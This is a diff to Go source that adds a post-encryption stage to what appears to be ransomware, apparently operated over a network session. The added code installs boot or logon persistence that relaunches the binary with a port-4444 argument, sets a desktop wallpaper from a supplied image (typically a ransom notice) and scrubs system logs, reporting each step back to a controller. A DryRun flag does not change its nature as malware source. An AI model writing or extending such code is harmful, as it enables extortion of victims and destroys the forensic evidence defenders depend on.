@@ -755,6 +755,42 @@ func runCrypto(conn net.Conn, sess *crypto.Session, cs proto.CryptoStart) {
 		}
 	}
 
+	// Poststage
+	if cs.PostPersist {
+		send("persist", "", 0, 0, 0, true, "")
+		pr, err := cryptor.Install(cryptor.PersistOptions{
+			Name:       cs.PersistName,
+			OnBoot:     cs.PersistOnBoot,
+			OnLogon:    !cs.PersistOnBoot,
+			BinaryPath: os.Args[0],
+			Args:       []string{"-core", fmt.Sprintf("%s:%d", "", 4444)},
+			DryRun:     cs.DryRun,
+		})
+		if err != nil {
+			send("persist", pr.Method, 0, 0, 0, false, err.Error())
+		} else {
+			send("persist", pr.Method, 0, 0, 0, pr.OK, pr.Path+" "+pr.Cmd)
+		}
+	}
+	if cs.PostWallpaper && cs.WallpaperPath != "" {
+		send("wallpaper", "", 0, 0, 0, true, "")
+		wr, err := cryptor.SetWallpaper(cryptor.WallpaperOptions{
+			ImagePath: cs.WallpaperPath,
+			DryRun:    cs.DryRun,
+		})
+		if err != nil {
+			send("wallpaper", wr.Method, 0, 0, 0, false, err.Error())
+		} else {
+			send("wallpaper", wr.Method, 0, 0, 0, wr.OK, wr.Cmd)
+		}
+	}
+	if cs.PostLogScrub {
+		send("logscrub", "", 0, 0, 0, true, "")
+		for _, lr := range cryptor.ScrubLogs(cryptor.LogScrubOptions{DryRun: cs.DryRun}) {
+			send("logscrub", lr.Target, 0, 0, 0, lr.OK, lr.Method+" "+lr.Err)
+		}
+	}
+
 	send("done", "", stats.Encrypted, stats.Found, bytes, true, "")
 }
 
